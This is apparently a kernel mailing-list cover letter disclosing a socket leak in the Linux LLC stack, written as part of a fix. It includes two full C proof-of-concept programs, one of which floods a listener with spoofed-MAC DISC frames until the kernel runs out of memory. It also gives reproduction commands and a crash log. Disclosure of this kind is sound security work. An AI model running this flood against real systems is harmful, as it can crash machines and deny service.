Received: from mail-pj2-f13.google.com (mail-pj2-f13.google.com [74.125.227.141])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 7164C1F91E3
	for <stable@vger.kernel.org>; Sat, 12 Sep 2026 16:53:19 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.141
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1789232001; cv=none; b=IRRcfEqDtXRvkWymj46ouUP/LD1OWDGJddF+DsKn3NPCa4uzFxHExfEh8Y7Yrv5GLOTOsRCkp3KfQaVoKV/v2hY8Fap/aLtKX0YFGvmCHfLeT+EDrmzNLkXu99Mfk7YBkSOYpbM/O7YtYBdLyVWf7Oj7crmYzSa+7oRUKIvXjP8=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1789232001; c=relaxed/simple;
	bh=G3Hia2qsxmT2phhi7i+AtGQ8HLQOGNBW5H8F/ZMR0RA=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=Z1319dKQwnu9ckN/KzolGKEDsuJkOi4i5siZE0hVOAqdw0NsQHZmzX2U9w4YAb1t8mspsK05KpgOB0OJJ+D9rxWi2Hh9x88N+D5u60Q/KYJHn66gv3m7bwegnGZU84Vjq94vBTBq4C9uHx0+MZEIVrL4Hb7Hn0KiiNBjdV6uoo0=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=NKTG76jt; arc=none smtp.client-ip=74.125.227.141
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="NKTG76jt"
Received: by mail-pj2-f13.google.com with SMTP id 98e67ed59e1d1-39dbdfaef3cso619492a91.1
        for <stable@vger.kernel.org>; Sat, 12 Sep 2026 09:53:19 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1789231999; x=1789836799; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=/Q33cGw5fJmB8NINMPvbfO0PglpOSyHmwq1hPR0ChNE=;
        b=NKTG76jt9ftLIcxKAqGiREgIcmrt5vah5N93kTZV6GwJQ8IlHmvW/pXlu4sQ4v/CVo
         NqGOjUT0/Xa+2Rv4rkwWyMv3EirMaK2wnD08hbiW6tXHlAwsJoPhox3ojti23KKxnOo6
         ozgo6nSUnSO99cM2BJSIFaiMdyOk86ekIp28R0a8OxPv7HhOWZ6+q4ntTyi7bV/KFZ5h
         D+s8STBsk8v6G62k4XZwr3zq99LlAuXxpj7abFlLljIO13Bx85coap5/ZVMxWp1BKPfc
         XDAEZIuKj49EAhbr1gPEN+eJUTBJzGIl2MHRCbSm8Rz1zcTyfVj5WqSekpC0E282JyiN
         1N6A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1789231999; x=1789836799;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=/Q33cGw5fJmB8NINMPvbfO0PglpOSyHmwq1hPR0ChNE=;
        b=KQOPg/RKqy57Ca94zk3icL3klH2V6AUUd87rdbfQYO7oNXbK7aeQdhPxUz4E6qFdAz
         ODyKWxLQBYxTibY+CjvaRcDa6Mmofshp0kJjzYCIP+l0pJIu258dJUDI4LR6BilAL9C0
         zBVqUZocv1Ia8OnQayvyICinktxByKZYixEMgh6rQHhRiY8S/XneDeZLTxYOzqEpzz3h
         93yi57PpTiSuqSzrWmM6hHD5DZpvEJXscj5dedORhPUJor+mhTOcBVeyzFwSESeuObJg
         y4t+hO4QneyL9RGrbRGOQl31gZgUz3mRgp2y+SPOLa9Vv4nhobYatehjCUZyAYVFPTGo
         Nunw==
X-Forwarded-Encrypted: i=1; AKwUvBy9yqEZBrByhaEc0OzhgwuzBA39RtEE4XD+0ds3MIzPPsRjh04mQ8rUNIIPl/rMenm9PZrudEw=@vger.kernel.org
X-Gm-Message-State: AFuF++lx19K16ax60z689QeIeHjhjKGfap8ThbqfWXGJ+41poXhmyo8G
	iQIiWIbzXb8T8LfDzidx3vut0kqUzLGb2m6KgjRDDsjyPLUH4EBT4CKt7sQ4YmXZLzmu
X-Gm-Gg: AYBFou2NxwsvEE3mLrTOzBnuej2jCSY0vNZhVUCG0fBFnuL8xbzZq4SjELcab77kJNN
	TBVjbQgY40ra8MCcFwYOaDcAmcit1ZZ8Wb30xN4L/s74JN02VjBcdt1406cItxTUEiSaZXarfJt
	ji6VDSiVmrjPaiLahjI9Wtd8WB4NV27ldvMf6dctlAleW+1i0I6kMwj09t2R3l6bCrNzZnWbT+x
	SxQf2vUg+ehcYon3YTzVSuziZMYl7CZSEQoq3p9uPe8bu44nBhH2XuTkxSpJjEXVgBSjLsCDHly
	AzE0/Q2H/w3H9fBmvP9ny87nwh0AfYnPE4IovT64KG6U5Bb0Uq/5y44skyApKa9AuOmK+CdCXjK
	Fsdn5+rY5EV+Kw8BN43XJHj5UAwDpKMjPVeLBgiLd4CSPpdTJwf+RRFHW8Glb/g/21SiP3L5RXq
	CFoR89J56PD/REYem6nbI+UU+oJLqzB4Hm7XBdvF1mADpzkjxFiJsuBvapm38pTsWo7wxEnpb62
	SWAdGw+kXb+75nAOd2V4Gu5rpJHX9/t9m8VInR8
X-Received: by 2002:a17:90b:57ce:b0:396:b918:c2a with SMTP id 98e67ed59e1d1-39d9c1dbb3emr18273850a91.12.1789231998369;
        Sat, 12 Sep 2026 09:53:18 -0700 (PDT)
Received: from b6ad5085b32f.. ([122.51.212.64])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-39d99531b21sm10907424a91.13.2026.09.12.09.53.14
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Sat, 12 Sep 2026 09:53:17 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: Zihan Xi <zihanx@nebusec.ai>,
	linux-kernel@vger.kernel.org,
	davem@davemloft.net,
	edumazet@google.com,
	kuba@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	stable@vger.kernel.org
Subject: [PATCH net v9 0/1] llc: fix listener child socket leak on non-SABME frames
Date: Sat, 12 Sep 2026 16:53:04 +0000
Message-ID: <cover.1789216793.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: stable@vger.kernel.org
List-Id: <stable.vger.kernel.org>
List-Subscribe: <mailto:stable+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:stable+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/llc/llc_conn.c. The reproducer
requires CAP_NET_RAW and CAP_NET_ADMIN in init_net.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

llc_conn_handler() creates a child socket for every frame matched by a
listening PF_LLC socket. llc_create_incoming_sock() publishes that child
in the SAP tables and takes a device reference before the frame is known
to be a passive-open request.

For listener-directed non-SABME traffic, no LLC_CONN_PRIM indication is
queued, so accept() cannot return the child and closing the listener does
not reclaim it. The leak reproducer uses the DISC path: a PF_LLC
SOCK_STREAM listener with injected DISC commands, each from a unique source
MAC. On the unpatched kernel, `wc -l /proc/net/llc/socket`
changed from 0 to 100 after the listener process exited. The raw proc table
from that run was not saved. Repeating that traffic until the 2 GB guest is
exhausted produces the panic_on_oom log below. It is later evidence of
memory exhaustion from out_of_memory() and a page fault in the PoC process;
it does not contain llc_conn_handler(). The panic was captured on
6.12.74 and decoded using a rebuilt 6.12.74 vmlinux (DEBUG_INFO=y,
KASAN=y). Some lockdep and
sanitizer helper frames and do_pte_missing retain raw offsets because the
rebuilt vmlinux does not match the original 6.12.74 #3 binary.

A SABME command is the valid passive-open request and is not the trigger
used by the leak reproducer. poc-sabme.c exercises the existing SABME
accept and listener-close paths. This patch does not change that lifecycle.

The accept-queue accounting and the llc_ui_accept() NULL dereference
concern are separate from this non-SABME leak. The v9 diff does not change
accept-queue accounting or llc_ui_accept(). Unbounded SABME child
allocation is a separate issue as well. None of these three issues is
claimed as fixed here.

The fix creates children only for SABME commands. DISC commands and other
P=1 commands are answered with a DM response addressed to the source
address decoded from the packet. Other non-SABME traffic is dropped before
it reaches the connection state machine. SABME child creation remains in
the existing path, preserving the existing passive-open tuple lookup
behavior.

The child publication and device-reference handling were introduced in
1da177e4c3f4 ("Linux-2.6.12-rc2") and retained by
d389424e00f9 ("[LLC]: Fix the accept path"). Fixes therefore points to
1da177e4c3f4.

PF_LLC socket creation is restricted to init_net. The PF_LLC listener
and the AF_PACKET injector require CAP_NET_RAW; CAP_NET_ADMIN is needed
to create and configure the veth pair. unshare -Urn is not used because
PF_LLC socket creation returns EAFNOSUPPORT outside init_net. The
reproducer therefore sets up a veth pair and injects AF_PACKET frames in
init_net.

The optional panic_on_oom setting only turns the final memory exhaustion
into stable crash evidence after leftover LLC sockets are already visible
in /proc/net/llc/socket. It is not required to trigger the leak itself.

packetdrill was not used because the trigger combines a PF_LLC listening
socket, AF_PACKET injection, a veth pair, and rotating source MAC
addresses to create distinct passive-open tuples. The C PoC shows that
combined resource-leak path directly.

Reproducer:

    gcc -O2 -static -o poc poc.c
    gcc -O2 -static -o poc-sabme poc-sabme.c
    ip link add llc_rx0 type veth peer name llc_tx0
    ip link set llc_rx0 address 02:11:22:33:44:55
    ip link set llc_tx0 address 02:11:22:33:44:66
    ip link set llc_rx0 up
    ip link set llc_tx0 up
    ./poc llc_rx0 llc_tx0 100
    wc -l /proc/net/llc/socket

The command above is the short DISC leak check. The additional SABME paths
are:

    ./poc-sabme accept llc_rx0 llc_tx0
    ./poc-sabme close llc_rx0 llc_tx0 100

For deterministic crash evidence, after leftover LLC sockets are confirmed
by the short run above, we additionally set panic_on_oom and run
the longer DISC flood:

    echo 2 > /proc/sys/vm/panic_on_oom
    ./poc llc_rx0 llc_tx0 110000

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define DEFAULT_REPORT_EVERY 10000ULL

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [rx_if] [tx_if] [count]\n"
		"  rx_if: LLC listener interface (default: %s)\n"
		"  tx_if: raw packet sender interface (default: %s)\n"
		"  count: number of DISC frames to send, 0 means forever\n",
		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");

	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd;

	fd = socket(AF_LLC, SOCK_STREAM, 0);
	if (fd < 0)
		die_errno("socket(AF_LLC)");

	get_if_hwaddr(ifname, mac);

	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");

	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int fd;
	int one = 1;
	int ifindex = get_ifindex(ifname);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die_errno("socket(AF_PACKET)");

	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

int main(int argc, char **argv)
{
	static unsigned char frame[ETH_ZLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_ll sll;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 0;
	uint64_t i = 1;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
		usage(argv[0]);
		return 0;
	}
	if (argc > 1)
		rx_if = argv[1];
	if (argc > 2)
		tx_if = argv[2];
	if (argc > 3) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[3], &end, 0);
		if (errno || !end || *end != '\0') {
			fprintf(stderr, "invalid count: %s\n", argv[3]);
			return EXIT_FAILURE;
		}
	}
	if (argc > 4) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst_mac, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	fprintf(stderr,
		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
	fprintf(stderr,
		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
		dst_mac[0], dst_mac[1], dst_mac[2],
		dst_mac[3], dst_mac[4], dst_mac[5]);
	fprintf(stderr,
		"sending LLC DISC commands with a unique spoofed source MAC each time\n");

	while (!count || i <= count) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);

		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");

		if (!(i % DEFAULT_REPORT_EVERY))
			fprintf(stderr, "sent=%llu\n",
				(unsigned long long)i);
		i++;
	}

	close(packet_fd);
	close(listener_fd);
	return 0;
}
------END poc.c--------

------BEGIN poc-sabme.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define SABME_CMD 0x6f

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd = socket(AF_INET, SOCK_DGRAM, 0);

	if (fd < 0)
		die_errno("socket(AF_INET)");
	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");
	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd = socket(AF_LLC, SOCK_STREAM, 0);

	if (fd < 0)
		die_errno("socket(AF_LLC)");
	get_if_hwaddr(ifname, mac);
	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);
	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");
	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int one = 1;
	int ifindex = get_ifindex(ifname);
	int fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

	if (fd < 0)
		die_errno("socket(AF_PACKET)");
	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;
	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");
	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

static void send_sabme(int packet_fd, int ifindex, const unsigned char dst[ETH_ALEN],
		       const unsigned char src[ETH_ALEN])
{
	static unsigned char frame[ETH_ZLEN];
	struct sockaddr_ll sll;

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst, ETH_ALEN);
	memcpy(frame + ETH_ALEN, src, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = SABME_CMD;
	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst, ETH_ALEN);
	if (sendto(packet_fd, frame, sizeof(frame), 0,
		   (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("sendto(AF_PACKET)");
}

static void usage(const char *prog)
{
	fprintf(stderr, "usage: %s accept|close [rx_if] [tx_if] [count]\n", prog);
}

int main(int argc, char **argv)
{
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	const char *mode;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 1;
	uint64_t i;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc < 2) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}
	mode = argv[1];
	if (argc > 2)
		rx_if = argv[2];
	if (argc > 3)
		tx_if = argv[3];
	if (argc > 4) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[4], &end, 0);
		if (errno || !end || *end != '\0' || !count) {
			fprintf(stderr, "invalid count: %s\n", argv[4]);
			return EXIT_FAILURE;
		}
	}

	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);
	fprintf(stderr, "mode=%s listener_if=%s sender_if=%s count=%llu\n",
		mode, rx_if, tx_if, (unsigned long long)count);

	if (!strcmp(mode, "accept")) {
		int child;
		struct sockaddr_llc addr;
		socklen_t addrlen = sizeof(addr);
		struct timeval tv = { .tv_sec = 5, .tv_usec = 0 };

		fill_src_mac(src_mac, 1);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		send_sabme(packet_fd, ifindex, dst_mac, src_mac);
		setsockopt(listener_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
		child = accept(listener_fd, (struct sockaddr *)&addr, &addrlen);
		if (child < 0)
			die_errno("accept(AF_LLC)");
		printf("SABME passive open accepted\naccept_rc=0\n");
		close(child);
		close(packet_fd);
		close(listener_fd);
		return 0;
	}

	if (!strcmp(mode, "close")) {
		for (i = 1; i <= count; i++) {
			fill_src_mac(src_mac, i);
			if (!memcmp(src_mac, dst_mac, ETH_ALEN))
				src_mac[ETH_ALEN - 1] ^= 1;
			send_sabme(packet_fd, ifindex, dst_mac, src_mac);
		}
		close(packet_fd);
		close(listener_fd);
		printf("SABME sent without accept and listener closed\n");
		return 0;
	}

	usage(argv[0]);
	return EXIT_FAILURE;
}
------END poc-sabme.c--------

------BEGIN leak sample------
The original leak-only oracle on the unfixed kernel was a line count of
/proc/net/llc/socket, not a preserved cat of that table. After 100 DISC
frames, and after the listener process had already exited:

  wc -l /proc/net/llc/socket
  before: 0 leftover LLC sockets
  after 100 frames: 100 leftover entries remained

No raw 100-row proc table from that run was kept. The panic_on_oom log
below is the later 110000-frame exhaustion of the 2 GB guest, not the
leak oracle itself.
------END leak sample--------

----BEGIN crash log----
[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled

[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3

[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[ 1665.706676][T10284] Call Trace:

[ 1665.706943][T10284]  <TASK>

[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:118 (discriminator 3))

[1665.707568][T10284] panic (kernel/panic.c:611)

[1665.707918][T10284] ? dump_header (arch/x86/include/asm/atomic64_64.h:15 include/linux/atomic/atomic-arch-fallback.h:2583 include/linux/atomic/atomic-long.h:38 include/linux/atomic/atomic-instrumented.h:3189 include/linux/vmstat.h:196 include/linux/vmstat.h:208 mm/oom_kill.c:183 mm/oom_kill.c:473)

[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:288)

[1665.708678][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)

[1665.709132][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)

[1665.709616][T10284] ? out_of_memory (mm/oom_kill.c:1158 (discriminator 1))

[1665.710024][T10284] out_of_memory (mm/oom_kill.c:1158 (discriminator 1))

[1665.710435][T10284] ? __pfx_out_of_memory (mm/oom_kill.c:1114)

[1665.710868][T10284] ? lock_acquire+0x2f/0xb0

[1665.711243][T10284] ? __alloc_pages_noprof (mm/page_alloc.c:4188 mm/page_alloc.c:4478 mm/page_alloc.c:4839)

[1665.711712][T10284] __alloc_pages_noprof (include/linux/vmstat.h:236 (discriminator 1) mm/page_alloc.c:4201 (discriminator 1) mm/page_alloc.c:4478 (discriminator 1) mm/page_alloc.c:4839 (discriminator 1))

[1665.712184][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)

[1665.712658][T10284] ? hlock_class+0x4e/0x130

[1665.713041][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)

[1665.713501][T10284] ? __pfx___alloc_pages_noprof (mm/page_alloc.c:4792)

[1665.713991][T10284] ? __pfx___lock_acquire+0x10/0x10

[1665.714431][T10284] ? __sanitizer_cov_trace_switch+0x54/0x90

[1665.714917][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)

[1665.715381][T10284] ? policy_nodemask (mm/mempolicy.c:1865 (discriminator 1) mm/mempolicy.c:2066 (discriminator 1))

[1665.715788][T10284] alloc_pages_mpol_noprof (include/linux/mm.h:1637)

[1665.716246][T10284] ? __pfx_alloc_pages_mpol_noprof (mm/mempolicy.c:2227)

[1665.716734][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)

[1665.717194][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)

[1665.717656][T10284] ? xas_load (lib/xarray.c:243)

[1665.718005][T10284] ? filemap_get_entry (mm/filemap.c:1850)

[1665.718439][T10284] folio_alloc_noprof (include/linux/instrumented.h:68 include/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-flags.h:829 include/linux/page-flags.h:850 mm/internal.h:703 mm/internal.h:699 mm/mempolicy.c:2356)

[1665.718847][T10284] filemap_alloc_folio_noprof (mm/filemap.c:1511)

[1665.719316][T10284] ? __pfx_filemap_alloc_folio_noprof (mm/filemap.c:996)

[1665.719803][T10284] ? filemap_fault (include/linux/instrumented.h:68 include/asm-generic/bitops/instrumented-non-atomic.h:141 include/linux/page-flags.h:562 mm/filemap.c:3241 mm/filemap.c:3342)

[1665.720231][T10284] __filemap_get_folio (mm/filemap.c:3818)

[1665.720683][T10284] filemap_fault (mm/internal.h:1002 mm/filemap.c:3242 mm/filemap.c:3342)

[1665.721097][T10284] ? __pfx_filemap_fault (mm/filemap.c:3315)

[1665.721534][T10284] ? do_pte_missing+0x165a/0x3ff0

[1665.721944][T10284] ? __pfx_lock_release+0x10/0x10

[1665.722375][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645)

[1665.722813][T10284] __do_fault (mm/memory.c:4887)

[1665.723172][T10284] ? __pfx_filemap_map_pages (mm/filemap.c:3645)

[1665.723621][T10284] do_pte_missing+0x174c/0x3ff0

[1665.724026][T10284] ? srso_alias_return_thunk (arch/x86/lib/retpoline.S:182)

[1665.724482][T10284] ? reacquire_held_locks+0x20b/0x4c0

[1665.724932][T10284] ? lock_vma_under_rcu (include/linux/mm.h:718 (discriminator 2) mm/memory.c:6266 (discriminator 2))

[1665.725374][T10284] __handle_mm_fault (mm/memory.c:4791 mm/memory.c:3963 mm/memory.c:5789 mm/memory.c:5932)

[1665.725805][T10284] ? __pfx_lock_release+0x10/0x10

[1665.726207][T10284] ? down_read_trylock (kernel/locking/rwsem.c:1604)

[1665.726640][T10284] ? __pfx___handle_mm_fault (mm/memory.c:5841)

[1665.727085][T10284] ? __pfx_down_read_trylock (kernel/locking/rwsem.c:1562)

[1665.727574][T10284] ? __pfx_lock_vma_under_rcu (mm/memory.c:6256)

[1665.728053][T10284] handle_mm_fault (mm/memory.c:2943)

[1665.728479][T10284] do_user_addr_fault (arch/x86/mm/fault.c:441 arch/x86/mm/fault.c:1230)

[1665.728921][T10284] exc_page_fault (arch/x86/include/asm/irqflags.h:37 arch/x86/include/asm/irqflags.h:114 arch/x86/mm/fault.c:1485 arch/x86/mm/fault.c:1534)

[1665.729305][T10284] asm_exc_page_fault (arch/x86/include/asm/idtentry.h:623)

[ 1665.729700][T10284] RIP: 0033:0x559e433ce5cb

